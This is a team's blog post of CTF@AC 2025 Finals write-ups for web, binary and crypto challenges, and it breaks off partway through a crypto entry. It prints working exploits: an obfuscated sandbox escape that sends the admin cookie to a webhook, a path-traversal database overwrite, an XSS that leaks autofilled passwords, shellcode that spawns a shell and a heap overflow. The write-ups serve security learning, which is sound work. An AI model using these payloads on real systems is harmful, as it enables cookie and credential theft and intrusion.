<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CTF@AC 2025 Finals | Paolo</title>
<meta name="keywords" content="ctfatac, ctf, binary, crypto, web, ctfatac2025">
<meta name="description" content="All the writeups of the CTF@AC Finals ctf 2025 edition.">
<meta name="author" content="Paolo">
<link rel="canonical" href="https://pascalctf.github.io/en/ctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.60a7a0a9923d020b71b53396c3a1eaa79c12b0e020c91cc166667dfe8ed1086c.css" integrity="sha256-YKegqZI9AgtxtTOWw6Hqp5wSsOAgyRzBZmZ9/o7RCGw=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://pascalctf.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://pascalctf.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://pascalctf.github.io/favicon.ico">
<link rel="apple-touch-icon" href="https://pascalctf.github.io/favicon.ico">
<link rel="mask-icon" href="https://pascalctf.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://pascalctf.github.io/en/ctf/ctfatac2025_finals/">
<link rel="alternate" hreflang="it" href="https://pascalctf.github.io/it/ctf/ctfatac2025_finals/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css" integrity="sha384-5TcZemv2l/9On385z///+d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.js" integrity="sha384-cMkvdD8LoxVzGF/RPUKAcvmm49FQ0oxwDF3BGKtDXcEc+T1b2N+teh/OJfpU0jr6" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          throwOnError : false
        });
    });
</script>

<meta property="og:url" content="https://pascalctf.github.io/en/ctf/ctfatac2025_finals/">
  <meta property="og:site_name" content="Paolo">
  <meta property="og:title" content="CTF@AC 2025 Finals">
  <meta property="og:description" content="All the writeups of the CTF@AC Finals ctf 2025 edition.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-11-09T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-09T00:00:00+00:00">
    <meta property="article:tag" content="Ctfatac">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Binary">
    <meta property="article:tag" content="Crypto">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Ctfatac2025">
    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
<meta name="twitter:title" content="CTF@AC 2025 Finals">
<meta name="twitter:description" content="All the writeups of the CTF@AC Finals ctf 2025 edition.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Capture The Flag üö©",
      "item": "https://pascalctf.github.io/en/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF@AC 2025 Finals",
      "item": "https://pascalctf.github.io/en/ctf/ctfatac2025_finals/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTF@AC 2025 Finals",
  "name": "CTF@AC 2025 Finals",
  "description": "All the writeups of the CTF@AC Finals ctf 2025 edition.",
  "keywords": [
    "ctfatac", "ctf", "binary", "crypto", "web", "ctfatac2025"
  ],
  "articleBody": "CTF@AC 2025 Finals We (Paolo) partecipated this CTF in Timi»ôoara from Fri, 07 Nov. 2025, 16:00 CET until Sun, 09 Nov. 2025, 10:00 CET arriving 2nd overall ü•≥.\nEven though it was our first experience as a CTF in an international contest we managed to have real fun while solving these challenges.\nTeam components that partecipated:\nMarco Balducci (@Cryingfreeman74) Alan Davide Bovo (@Hecker404) Enea Maroncelli (@Zazaman) Web üåê Silicon Dioxide Analysis This challenge provided the source code for a Node.js web application designed for writing and sharing ‚Äúsandboxed‚Äù JavaScript code to edit a canvas. It had both a frontend and a backend handling the JavaScript execution.\nFrontend The frontend implemented a homemade ‚Äúsandboxed‚Äù environment to run JavaScript code as follows:\n/** * Super Duper Sandbox */ function canvasSandbox(code) { try { const sandboxFunc = new Function( \"canvas\", ` const window = undefined; const document = undefined; const alert = undefined; const console = undefined; const eval = undefined; const Function = undefined; const setTimeout = undefined; const setInterval = undefined; const fetch = undefined; const XMLHttpRequest = undefined; const WebSocket = undefined; const localStorage = undefined; const sessionStorage = undefined; const location = undefined; const history = undefined; const navigator = undefined; const parent = undefined; const top = undefined; const self = undefined; const globalThis = undefined; canvas.constructor = null; canvas.__proto__.constructor = null; canvas.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null; canvas.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null; ${code} ` ); sandboxFunc.call(null, canvas); } catch (err) { alert(\"Sorry, your code did not run.\"); } } It also provided a function that automatically executed any JavaScript code passed through the /?code= query parameter inside this sandboxed environment.\nBackend The backend was responsible for sharing the code and included an additional layer of checks:\nconst allowed_keywords = [ \"const\", \"ctx\", \"canvas\", \"getContext\", \"console\", \"let\", \"vx\", \"vy\", \"radius\", \"function\", \"update\", \"clearRect\", \"width\", \"height\", \"if\", \"beginPath\", \"arc\", \"Math\", \"PI\", \"fillStyle\", \"orange\", \"fill\", \"requestAnimationFrame\" ]; function checkCode(code) { const matches = code.match(/[A-Za-z]{2,}/g) || []; const disallowed = matches.filter((k) =\u003e !allowed_keywords.includes(k)); return disallowed.length === 0; } The /share endpoint worked as follows:\nIt checked the code for disallowed keywords. It made a Chromium bot run it using the /?code= endpoint. However, the main vulnerability was in the flag cookie ‚Äî it was stored with httpOnly: false, meaning a simple XSS could easily steal it.\ncontext.addCookies([ { name: \"flag\", domain: \"localhost\", path: \"/\", value: FLAG, sameSite: \"Lax\", secure: false, httpOnly: false } ]); Solution After analyzing the entire challenge, finding a working solution was straightforward. The backend‚Äôs keyword check could be bypassed using UTF-8 encoding (bypassing the [A-Za-z]{2,} regex check). Then, the frontend could be exploited using the keyword this.\nThe frontend only removed direct references to most JavaScript functions but didn‚Äôt properly sanitize access through the actual window or document context.\nOnce we realized this, we wrote a fully working exploit that exfiltrated the admin‚Äôs cookie using a fetch request to our webhook.\nExploit const ctx = canvas.getContext('2d'); const p = ctx['\\u005f\\u005f\\u0070\\u0072\\u006f\\u0074\\u006f\\u005f\\u005f']; const c = p['\\u0063\\u006f\\u006e\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u006f\\u0072']; const f = c['\\u0063\\u006f\\u006e\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u006f\\u0072']; const g = f('\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0074\\u0068\\u0069\\u0073')(); const d = g['\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074']; const s = d['\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065']; const e = g['\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u0055\\u0052\\u0049\\u0043\\u006f\\u006d\\u0070\\u006f\\u006e\\u0065\\u006e\\u0074']; const h = g['\\u0066\\u0065\\u0074\\u0063\\u0068']; const u = e(s); h('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0077\\u0065\\u0062\\u0068\\u006f\\u006f\\u006b\\u002e\\u0073\\u0069\\u0074\\u0065\\u002f\\u0035\\u0063\\u0035\\u0038\\u0037\\u0066\\u0037\\u0061\\u002d\\u0031\\u0063\\u0030\\u0030\\u002d\\u0034\\u0035\\u0038\\u0032\\u002d\\u0061\\u0035\\u0062\\u0033\\u002d\\u0031\\u0061\\u0030\\u0038\\u0064\\u0065\\u0032\\u0031\\u0032\\u0033\\u0061\\u0062\\u003f\\u0064\\u003d' + u); Once executed, the flag appeared in the webhook logs as:\nd=flag=CTF{c0d2d75449e3167001cbb38b891a78c8168c165d2cbd48f8f7b3123759963f66}\nRetro Forum Analysis Retro Forum was a post/chat web platform where users could share their thoughts and administrators could moderate them.\nThe source code revealed how the SQLite database was structured and where it was stored, along with the main vulnerability in this route:\n@app.route('/edit_profile', methods=['GET', 'POST']) def edit_profile(): if 'user_id' not in session: return redirect(url_for('login')) conn = get_db() c = conn.cursor() if request.method == 'POST': new_bio = request.form['bio'] filename = None if 'profile_pic' in request.files: file = request.files['profile_pic'] if file: filename = file.filename print(filename) file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)) c.execute(\"UPDATE users SET profile_pic=? WHERE id=?\", (filename, session['user_id'])) c.execute(\"UPDATE users SET bio=? WHERE id=?\", (new_bio, session['user_id'])) conn.commit() conn.close() return redirect(url_for('profile', id=session['user_id'])) c.execute(\"SELECT bio, profile_pic FROM users WHERE id=?\", (session['user_id'],)) bio, pic = c.fetchone() conn.close() return render_template('edit_profile.html', bio=bio, pic=pic) Here, the image uploaded by the user was saved without any sanitization or validation, leaving the platform vulnerable to a path traversal attack, allowing the user to overwrite any file with their uploaded image.\nBefore explaining the solution, it‚Äôs important to note the existence of the debug_file endpoint:\n@app.route('/debug/') def debug_file(filename): if not session.get('is_admin'): return redirect(url_for('login')) try: file_path = os.path.join(os.getcwd(), filename) with open(file_path, 'r') as f: content = f.read() return content, 200, {'Content-Type': 'text/plain'} except Exception as e: return f\"Error: {str(e)}\", 404 This endpoint later gave arbitrary read access to the full filesystem, allowing us to retrieve the actual flag.\nSolution Once the path traversal vulnerability was confirmed, the next step was to overwrite the retro.db file by uploading a malicious file named ../../retro.db through the profile picture upload form.\nAfter successfully overwriting the database, I gained admin privileges, which allowed me to use another path traversal vulnerability in the debug file endpoint to read arbitrary files.\nFrom there, I downloaded flag.txt\ngAAAAABpDfJWpJyLk4xz6hJCspj6XEpp0dCKgZUegC18TYQHfABujfRSTCa0zEei6qnDP6k8I-2V0by1aeJSEhKhhWI5EWppnQ== and populate.py, which contained the logic for initializing the database.\nInside populate.py, I found default user data and posts, including a user named Josh, who frequently mentioned his password in his social posts and chats.\nBy analyzing these, I inferred that Josh‚Äôs password was used as the key to encrypt the flag with Fernet. Using this clue, I brute-forced all possible combinations of his password fragments until the flag decrypted successfully.\nScript Several scripts were used to solve this challenge, but the two most significant are the exploit to gain admin privileges and the password brute-forcing script.\nAdmin Privilege Exploit #!/usr/bin/env python3 import requests import sys, os import sqlite3, tempfile from werkzeug.security import generate_password_hash URL = sys.argv[1] assert requests.get(f\"{URL}/\").status_code == 200 def init_db(filename=\"retro.db\"): conn = sqlite3.connect(filename) c = conn.cursor() c.execute('''CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, bio TEXT, is_admin INTEGER DEFAULT 0, profile_pic TEXT DEFAULT 'default.png' )''') c.execute('''CREATE TABLE posts ( id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, title TEXT, content TEXT, FOREIGN KEY (user_id) REFERENCES users(id) )''') c.execute('''CREATE TABLE comments ( id INTEGER PRIMARY KEY AUTOINCREMENT, post_id INTEGER, user_id INTEGER, content TEXT, FOREIGN KEY (post_id) REFERENCES posts(id), FOREIGN KEY (user_id) REFERENCES users(id) )''') c.execute('''CREATE TABLE chats ( id INTEGER PRIMARY KEY AUTOINCREMENT, user1_id INTEGER, user2_id INTEGER, FOREIGN KEY (user1_id) REFERENCES users(id), FOREIGN KEY (user2_id) REFERENCES users(id) )''') c.execute('''CREATE TABLE messages ( id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, sender_id INTEGER, content TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, FOREIGN KEY (chat_id) REFERENCES chats(id), FOREIGN KEY (sender_id) REFERENCES users(id) )''') c.execute(\"INSERT INTO users (username, password, bio, is_admin) VALUES (?, ?, ?, 1)\", (\"admin\", generate_password_hash(\"admin123\"), \"Retro overlord\")) conn.commit() conn.close() s = requests.Session() s.post(f\"{URL}/register\", data={ \"username\": (username := os.urandom(20).hex()), \"password\": (password := os.urandom(20).hex()), \"bio\": \"hello\", }) s.post(f\"{URL}/login\", data={ \"username\": username, \"password\": password, }) with tempfile.NamedTemporaryFile(\"w+b\") as tf: print(tf.name) init_db(tf.name) s.post(f\"{URL}/edit_profile\", data={ \"bio\": \"palle\", }, files={ \"profile_pic\": (\"../../retro.db\", tf, \"image/jpeg\"), }) print(\"[*] Uploaded malicious profile picture\") s.get(f\"{URL}/logout\") r = s.post(f\"{URL}/login\", data={ \"username\": \"admin\", \"password\": \"admin123\", }) print(s.cookies.get_dict()) Password Brute-Force Script N.B.: The lists d and n contained words and dates found in Josh‚Äôs chats, which hinted at the password structure.\nimport base64, itertools from cryptography.fernet import Fernet from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC d = ['20.05.2023', '14.03.2001'] n = ['pixel', 'wigglepuff'] i = n + d l = list(itertools.permutations(i)) for perm in l: password = \".\".join(perm).encode() salt = b\"whatever\" kdf = PBKDF2HMAC( algorithm=hashes.SHA256(), length=32, salt=salt, iterations=390000, ) key = base64.urlsafe_b64encode(kdf.derive(password)) f = Fernet(key) with open(\"flag.txt\", \"rb\") as fh: token = fh.read() try: plaintext = f.decrypt(token) print(f\"Password found: {password.decode()}\") print(plaintext.decode()) break except: continue This combination of exploits and analysis led to the successful decryption of the flag and completion of the challenge.\nNot wordle Analysis This challenge was a Node.js Wordle-like platform where you could guess some random words (all of them were exactly 5 characters).\nHowever, the challenge provided a switch for ‚Äúrandom‚Äù/‚Äúdaily‚Äù words. The second one, especially, used a special code wotd. After analyzing the backend source for a while I found this little snippet that implemented the logic for word generation.\nfunction getSecret(mode, cookies) { const m = (mode || cookies.mode || 'random').toLowerCase(); if (m === 'wotd') { const flag = (process.env.FLAG || 'REAL_FLAG_ON_REMOTE').toLowerCase(); return { mode: 'wotd', secret: flag }; } let secret = cookies.randomSecret; if (!secret || !/^[a-z]{5}$/.test(secret)) { secret = pickRandomWord(); } return { mode: 'random', secret }; } Here it‚Äôs clear that the flag was the daily word on the platform, and basically all we had to do was find it.\nSolution Since the challenge didn‚Äôt store any counter for how many times a user tried to guess, it was trivial to find the flag by brute force.\nNevertheless, the challenge didn‚Äôt even check the length of the guess, so it was also possible to brute-force the word character-by-character using the alphabet 0123456789abcdefCTF{}.\nScript #!/usr/bin/env python3 import string, requests URL = \"http://a733fa9b.ctf.ac.upt.ro\" LENGTH = 69 CHARSET = 'CTF{}' + string.hexdigits.lower() s = requests.Session() s.post(URL + \"/api/start?mode=wotd\") flag = '' for i in range(LENGTH): for c in CHARSET: r = s.post(URL + \"/api/check\", json={\"guess\": flag + c}).json() if r['feedback'][i][\"status\"] == \"correct\": flag += c print(flag) break print(\"FLAG:\", flag) lolchat2 Analysis This challenge was a sequel to the original lolchat, which we didn‚Äôt solve during the qualifiers round. It provided a room-based chat developed using WebSockets in a black-boxed environment, we didn‚Äôt have access to the backend source code, so several assumptions had to be made.\nAs in the original challenge, the first three rooms didn‚Äôt respond to our messages. However, in the party and game chat rooms, there were some users exchanging random messages.\nThe most interesting one was the game room, where the user tom repeatedly sent the same messages, asking for help finding his password (the flag). The most notable messages included:\n‚Äúi think i had a password saved in my browser‚Äù ‚Äúit would usually fill it out for me‚Äù Solution After some quick observations, it became clear that the platform was heavily vulnerable to XSS (Cross-Site Scripting), the only actual validation was client-side, applied only when sending messages, not when receiving them.\nInitially, we tried redirecting the bot to our webhook, but this didn‚Äôt work, it was likely restricted to its localhost network. We then hypothesized that the best approach would be to make the bot send a message to the chat containing sensitive data using our injected script, and this time, it worked.\nUltimately, we realized we could make the bot autofill a password input field (using its saved credentials) and send the value directly to the chat for everyone to see.\nScript Below is the HTML code we used to solve the challenge. It relied on the assumption that the bot‚Äôs browser would automatically fill in the password input, triggering the oninput event, which then sent the message to the game chat room.\n\u003cform\u003e \u003cinput type=\"password\" name=\"password\" autocomplete oninput=\"window.socket.emit('sendMessage', { room: 'game', message: document.getElementsByName('password')[0].value });\"\u003e \u003c/form\u003e Binary exploitation üè¥‚Äç‚ò†Ô∏è baby-ikea Analysis The challenge provided the possibility to connect using netcat to the server and send some data. Reading the errors that the service was responding with, it was clear that you were only allowed to send base64-encoded data.\nI tried some random instructions in assembly and I found out that it was a 32-bit architecture and it would run arbitrary asm code.\nSolution The solution involved writing a complete asm script in the correct structure and making it do whatever you wanted. I decided to make it spawn a shell, then base64-encode the script and send it to the server.\nScript from pwn import * import base64 p = remote('?', ?) ## Calls execve('/bin/sh') and spawns a shell shellcode = \"\"\" section .data path db '/bin/sh', 0 envp dd 0 section .text global _start _start: mov eax, 11 ; syscall number for execve mov ebx, path ; filename pointer mov edx, envp ; envp pointer int 0x80 ; call kernel mov eax, 1 xor ebx, ebx int 0x80 \"\"\" p.sendlineafter('\u003e ', base64.b64encode(shellcode.encode()).decode()) p.interactive() Tetrastack Analysis Tetrastack is a service that lets us play Tetris.\nBy analyzing the different menu entries, we can see there is an option to save our name, but only after the game is over. The decompiled function set_name is the following:\nvoid __cdecl set_name(Player *p) { size_t v1; // rax signed __int64 got; // [rsp+20h] [rbp-10h] signed __int64 n; // [rsp+28h] [rbp-8h] if ( board-\u003egame_over ) { puts(\"\\nEnter display name length:\"); n = read_long(); if ( n \u003e 0 ) { puts(\"Enter display name bytes:\"); got = read_n((unsigned __int8 *)p-\u003ename, n); ... As we can see, there is a vulnerability in how the name length is read. The length has a lower bound check (n \u003e 0) but no upper bound (n \u003c 64), so we can send something like 255 to perform a buffer overflow.\nTo actually get something out of the overflow, we need to understand where player-\u003ename is in memory and what is positioned after it.\nOur answer lies in the main function:\nplayer = (Player *)calloc(1u, 0x10u); player-\u003ename_cap = 64; v4 = player; v4-\u003ename = (char *)malloc(player-\u003ename_cap); callbacks = (Callbacks *)malloc(0x10u); callbacks-\u003eon_gameover = real_gameover; callbacks-\u003eon_lineclear = 0; As we can see, the name is on the heap, and immediately after it there is a Callbacks struct that contains two function pointers: on_gameover and on_lineclear.\nSolution With the help of GDB, I found the precise heap offsets and was able to overwrite the on_gameover function pointer with the address of win.\nScript #!/usr/bin/env python3 from pwn import * elf = ELF(\"./tetrastack_patched\") context.binary = elf context.terminal = ('kgx', '-e') def conn(): if args.REMOTE: r = remote(\"8a0e1141.ctf.ac.upt.ro\", 9449) elif args.GDB: r = gdb.debug(elf.path, ''' b main b set_name continue ''') else: r = process(elf.path) return r def wait_menu_or_prompt(io, prompt=b\"8) Quit\"): data = b\"\" while True: chunk = io.recvuntil(b\"\\n\", timeout=0.5) if not chunk: continue data += chunk if b\"Enter display name length\" in data: return data, True if prompt in data: return data, False def reach_game_over(io, max_steps=2000): data, got_prompt = wait_menu_or_prompt(io) if got_prompt: return for _ in range(max_steps): io.sendline(b\"1\") data, got_prompt = wait_menu_or_prompt(io) if got_prompt: log.info(\"Reached name prompt\") return raise RuntimeError(\"Failed to trigger game over\") def main(): r = conn() reach_game_over(r) r.sendline(b'88') r.sendlineafter(b'bytes:', b'a' * 80 + p64(elf.sym.win)) r.sendline(b'8') x = r.recvall(timeout=1).decode() r.close() print(x) # r.interactive() if __name__ == \"__main__\": main() mini-e8 Analysis mini-e8 is a small REPL-based ‚Äúengine‚Äù binary. The Engine constructor reads flag.txt, computes a 64‚Äëbyte rolling XOR checksum, XORs that with 0x7E3A829F, and stores a 16‚Äëbyte flag_header followed by the flag bytes in an arena pointed to by (QWORD*)Engine + 5. A separate JS‚Äëstyle byte buffer shares this arena in front of the flag_header.\nHeader Layout (little-endian dwords) flag_header[0] = 0x00000001 # must be forced to 0 for getflag flag_header[1] = checksum(flag)^0x7E3A829F flag_header[2] = 0x8BADF00D # magic constant checked by getflag flag_header[3] = 0x00000000 # becomes our ‚Äúunlock‚Äù field; needs 42 before second opt Flag bytes start at flag_header + 0x10.\nCritical Functions Engine::Engine: Writes flag_header + flag into arena; compute_checksum(flag): rolling XOR of first 64 bytes then XOR with 0x7E3A829F. cmd_optimize_function (opt): First call enables ‚Äúfast mode‚Äù (writes check capacity). Second call: if flag_header[3] == 42, sets an enable byte at Engine+0x80 to 1. cmd_getflag (getflag) requires: flag_header[2] == 0x8BADF00D recomputed_checksum ^ 0x7E3A829F == flag_header[1] flag_header[0] == 0 enable byte at Engine+0x80 == 1 Vulnerability In fast mode, write validates idx \u003c capacity instead of idx \u003c length. Capacity \u003e length, so indices beyond the logical buffer body (\u003e= current length) can include the adjacent flag_header. This gives controlled single‚Äëbyte writes to flag_header fields.\nif ( *((_BYTE *)this + 0x20) \u0026\u0026 a2 \u003c *((_QWORD *)this + 5) || a2 \u003c *((_QWORD *)this + 2) ) { result = *(_QWORD *)this; *(_BYTE *)(*((_QWORD *)this + 1) + **(_QWORD **)this + a2) = a3; } Offsets Mapped to Header Bytes After first opt, since flag_header is located after the buffer in memory, the following indices (in the REPL) address the flag_header:\n64..67 -\u003e flag_header[0] 68..71 -\u003e flag_header[1] 72..75 -\u003e flag_header[2] 76..79 -\u003e flag_header[3] We only need to change flag_header[0] (set all four bytes to 0) and flag_header[3] (set least significant byte to 42 and clear the rest) before invoking the second opt.\nSolution Run opt once to enter fast (capacity-based) write mode. Zero flag_header[0] by writing 0 to offsets 64‚Äì67. Set unlock value: write bytes 76‚Äì79 as 42, 0, 0, 0 so flag_header[3] == 42. Run opt again; second optimize sees header[3] == 42 and flips the enable byte. Call getflag; all conditions now satisfy and it prints the flag from header+0x10. opt write 64 0 write 65 0 write 66 0 write 67 0 write 76 42 write 77 0 write 78 0 write 79 0 opt getflag Script steps = [ b\"opt\", # enter fast path b\"write 64 0\", # flag_header[0] byte 0 b\"write 65 0\", # flag_header[0] byte 1 b\"write 66 0\", # flag_header[0] byte 2 b\"write 67 0\", # flag_header[0] byte 3 b\"write 76 42\", # flag_header[3] byte 0 -\u003e 42 b\"write 77 0\", # remaining bytes zeroed b\"write 78 0\", b\"write 79 0\", b\"opt\", # second optimize flips enable if header[3]==42 b\"getflag\", # prints flag if all checks pass ] Cryptography üîë Sparse Hills Analysis We looked at the service as a simple linear cipher over Z_257, where the server computes $c = K m \\bmod 257$. The same 257√ó257 key matrix is reused, inputs are zero‚Äëpadded to a full block, and outputs are printed as three‚Äëhex‚Äëdigit numbers. Since the oracle lets us encrypt anything and the mapping is linear, we can reveal the columns of $K$ by encrypting basis vectors. That means we can recover the key and, from there, the flag.\nSolution I first grab the encrypted flag so we have its ciphertext. Then we encrypt each canonical basis vector,one position set to 1, the rest 0. Each such query returns a column of $K$. When we stack those results, we reconstruct the whole matrix. I invert this matrix modulo 257 using Gauss‚ÄëJordan elimination (Fermat inverses make division easy), multiply the inverse by the flag ciphertext to get the plaintext vector, turn 256 into 0 when converting to bytes, strip the zero padding, and decode as UTF‚Äë8. We need exactly 257 encryptions for recovery, and the inversion is fast at this size.\nScript import socket import sys import re from typing import List P = 257 # Prime modulus N = 257 # Block length == dimension def recv_until(sock: socket.socket, marker: bytes) -\u003e bytes: \"\"\"Read from socket until `marker` appears.\"\"\" buf = bytearray() while marker not in buf: chunk = sock.recv(4096) if not chunk: break buf += chunk return bytes(buf) def recv_all(sock: socket.socket) -\u003e bytes: \"\"\"Read until the socket is closed and return all bytes.\"\"\" buf = bytearray() while True: chunk = sock.recv(65536) if not chunk: break buf += chunk return bytes(buf) HEX3_RE = re.compile(r\"^(?:[0-9a-f]{3}\\s+){256}[0-9a-f]{3}$\", re.IGNORECASE) def parse_hex_vector(blob: bytes) -\u003e List[int]: \"\"\"Extract the final 257-entry hex vector from a server response.\"\"\" text = blob.decode(errors=\"ignore\") for line in reversed(text.strip().splitlines()): line = line.strip() if HEX3_RE.fullmatch(line): return [int(tok, 16) for tok in line.split()] raise ValueError(\"Could not find a valid ciphertext line in server output.\") # Oracle wrappers def get_encrypted_flag(host: str, port: int) -\u003e List[int]: \"\"\"Request option 1 from the server and parse the returned ciphertext.\"\"\" s = socket.socket() s.connect((host, port)) recv_until(s, b\"\u003e \") s.sendall(b\"1\\n\") data = recv_all(s) s.close() return parse_hex_vector(data) def encrypt(host: str, port: int, block: bytes) -\u003e List[int]: \"\"\"Request option 2 and send a 257-byte block, returning the ciphertext.\"\"\" assert len(block) == N, \"block must be exactly N=257 bytes\" s = socket.socket() s.connect((host, port)) recv_until(s, b\"\u003e \") s.sendall(b\"2\\n\") recv_until(s, b\"\u003e \") s.sendall(block) data = recv_all(s) s.close() return parse_hex_vector(data) # Modular algebra def mat_inv_mod_p(A: List[List[int]], p: int) -\u003e List[List[int]]: \"\"\"Compute the inverse of A modulo prime p using Gauss-Jordan.\"\"\" n = len(A) M = [[A[i][j] % p for j in range(n)] for i in range(n)] I = [[1 if i == j else 0 for j in range(n)] for i in range(n)] for col in range(n): # Find a pivot row with nonzero in column 'col' pivot = col while pivot \u003c n and M[pivot][col] == 0: pivot += 1 if pivot == n: raise ValueError(\"Matrix not invertible (no pivot).\") # Swap to current row if needed if pivot != col: M[col], M[pivot] = M[pivot], M[col] I[col], I[pivot] = I[pivot], I[col] # Normalize pivot row inv_piv = pow(M[col][col], p - 2, p) # Fermat inverse (p is prime) for j in range(n): M[col][j] = (M[col][j] * inv_piv) % p I[col][j] = (I[col][j] * inv_piv) % p # Eliminate this column from all other rows for r in range(n): if r == col: continue factor = M[r][col] if factor: for j in range(n): M[r][j] = (M[r][j] - factor * M[col][j]) % p I[r][j] = (I[r][j] - factor * I[col][j]) % p return I def mat_vec_mod_p(M: List[List[int]], v: List[int], p: int) -\u003e List[int]: n = len(M) out = [0] * n for i in range(n): s = 0 row = M[i] for j in range(n): s += row[j] * v[j] out[i] = s % p return out def recover_matrix_K(host: str, port: int) -\u003e List[List[int]]: K_cols = [] for i in range(N): block = bytearray(N) block[i] = 1 # e_i (mod 257) y = encrypt(host, port, bytes(block)) if len(y) != N: raise RuntimeError(\"oracle returned wrong vector length\") K_cols.append(y) # Optional progress indicator if (i + 1) % 16 == 0 or i == N - 1: print(f\"[+] collected {i + 1}/{N} columns of K\") # Convert \"list of columns\" -\u003e 2D matrix (row-major) K = [[K_cols[j][i] for j in range(N)] for i in range(N)] return K def strip_zero_padding(mbytes: bytes) -\u003e bytes: if 0 in mbytes: return mbytes[:mbytes.index(0)] return mbytes def main(): host = sys.argv[1] if len(sys.argv) \u003e= 2 else \"127.0.0.1\" port = int(sys.argv[2]) if len(sys.argv) \u003e= 3 else 12346 print(f\"[*] Target: {host}:{port}\") print(\"[*] Fetching encrypted flag...\") c_flag = get_encrypted_flag(host, port) print(\"[+] Got encrypted flag (257 integers).\") print(\"[*] Recovering encryption matrix K via 257 chosen-plaintext queries...\") K = recover_matrix_K(host, port) print(\"[+] Recovered K.\") print(\"[*] Inverting K modulo 257...\") K_inv = mat_inv_mod_p(K, P) print(\"[+] Inverted K.\") print(\"[*] Decrypting flag...\") m_vec = mat_vec_mod_p(K_inv, c_flag, P) # Sanity: we expect every coordinate to be in 0..255 (not 256) if any(x == 256 for x in m_vec): print(\"[!] Warning: found value 256 in plaintext vector; replacing with 0 for bytes().\") m_bytes = bytes((0 if x == 256 else x) for x in m_vec) m_bytes = strip_zero_padding(m_bytes) try: decoded = m_bytes.decode(\"utf-8\", errors=\"replace\") except Exception: decoded = repr(m_bytes) print(decoded) if __name__ == \"__main__\": main() Black prince Analysis Recon showed a very simple web app with two endpoints: /encode: takes an input constrained to uppercase letters A‚ÄìZ, digits 0‚Äì9, braces {} and underscore _, and renders a sequence of four-letter tokens. /flag: renders a long ‚Äúsentence‚Äù made entirely of four-letter words (tokens) instead of a human-readable flag. /encode is a randomized encoder that maps each input character to one of several possible four-letter tokens. The /flag page is the encoded flag using those tokens.\nA single pass over the character set only reveals a subset of tokens. To decode /flag, we must harvest all token variants that appear on /flag by repeatedly querying /encode with repeated characters and 